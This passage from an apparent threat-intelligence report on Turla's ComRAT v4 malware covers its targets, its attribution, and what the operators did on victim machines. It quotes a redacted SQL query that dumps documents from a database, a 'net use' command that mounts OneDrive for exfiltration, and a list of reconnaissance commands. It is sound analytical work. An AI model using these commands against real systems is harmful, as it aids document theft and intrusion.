@@ -1,0 +1,136 @@
+2012
+ComRAT v3
+ComRAT v4 release
+Last known ComRAT v3
+activity
+Figure 3 // Timeline of ComRAT
+During our investigation, we were able to identify three different targets where ComRAT v4 has been used:
+
+
+Two Ministries of Foreign Affairs in Eastern Europe
+
+
+One national parliament in the Caucasus region
+
+
+This targeting is in-line with other campaigns we described in the past.
+3.3 Attribution to Turla
+Based on the victimology and the TTPs, we believe that ComRAT is used exclusively by a single APT group.
+Moreover, there are a few elements linking ComRAT v4 to Turla:
+
+
+It uses the same internal name, Chinch, as the previous versions
+
+
+It uses the same custom C&C protocol over HTTP as ComRAT v3
+
+
+A part of the network infrastructure is shared with Mosquito [18]
+
+
+It was dropped by, or has dropped other, Turla malware families:
+
+
+A PowerShell loader [1]
+
+
+The PowerStallion backdoor [1]
+
+
+The RPC Backdoor [1]
+
+
+Therefore, we believe that the ComRAT v4 malware family is part of the Turla arsenal.
+3.4 Insight into attacker’s activity
+During our investigation, we were able to get insights about what Turla operators were doing
+on the compromised machines.
+The main use of ComRAT is discovering, stealing and exfiltrating confidential documents. In one case,
+its operators even deployed a .NET executable to interact with the victim’s central MS SQL Server database
+containing the organization’s documents. Figure 4 is the redacted SQL command.
+8 From Agent.BTZ to ComRAT v4 A ten-year journey
+sqlCommand.CommandText = “select top “ + num2.ToString() + “ filename, img,
+datalength(img), id from  with(nolock) where not img is null and id>” + num4.
+ToString();
+sqlCommand.CommandText += “ and datalength(img)<1500000 and (filename like ‘%.doc’
+or filename like ‘%.docx’ or filename like ‘[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]%.pdf’
+or (filename like ‘3%.pdf’ and len(filename)>9))”;
+sqlCommand.CommandText += “ order by id”;
+Figure 4 // SQL command to dump documents from the central database (partially redacted)
+These documents were then compressed and exfiltrated to a cloud storage provider such as OneDrive
+or 4shared. Cloud storage is mounted using the ~~net use~~ command as shown in Figure 5.
+tracert -h 10 yahoo.com
+net use https://docs.live.net/E65 
+/u:@aol.co.uk
+tracert -h 10 yahoo.com
+Figure 5 // Command to mount a OneDrive folder using ~~net use~~ (partially redacted)
+In addition to document stealing, the operators also run many commands to gather information about
+the Active Directory groups or users, the network or Microsoft Windows configurations such as the group
+policies. Figure 6 is a list of commands executed by Turla operators.
+```
+       gpresult /z
+       gpresult /v
+       gpresult
+       net view
+   net view /domain
+
+   netstat
+
+```
+netstat -nab
+netstat -nao
+nslookup 127.0.0.1
+ipconfig /all
+arp -a
+```
+       net share
+   net use
+
+   systeminfo
+
+   net user
+
+   net user administrator
+
+   net user /domain
+   net group
+   net group /domain
+   net localgroup
+   net localgroup
+   net localgroup Administrators
+
+```
+net group “Domain Computers” /domain
+net group “Domain Admins” /domain
+net group “Domain Controllers” /domain
+dir “%programfiles%”
+net group “Exchange Servers” /domain
+```
+       net accounts
+   net accounts /domain
+   net view 127.0.0.1 /all
+   net session
+
+   route print
+
+```
+ipconfig /displaydns
+Figure 6 // Basic recon of the compromised machine
+9 From Agent.BTZ to ComRAT v4 A ten-year journey
+Finally, we also noticed that Turla operators are aware of and try to evade security software. For instance,
+they regularly exfiltrate security-related log files in order to understand whether their malware samples
+have been detected. This shows the level of sophistication of this group and its intention to stay
+on the same machines for a long time.
+We also extracted the times at which Gmail received the emails sent by the operators, which should be
+very close to the time at which commands were sent by the operators through the email C&C channel.
+We believe this is a good metric because the emails are later processed by the backdoor. Thus, it shows
+the time at which the operators were working and not the time at which the infected computer executed
+malicious commands.
+Figure 7 represents the time of day that commands were sent, in a one-month period. Given the distribution,
+it is likely that the operators are working in the UTC+3 or UTC+4 time zone.
+Number of emails received
+40
+30
+20
+0
+0 2 4 6 8 10 12 14 16 18 20 22
+Figure 7 // Turla operators’ working hours
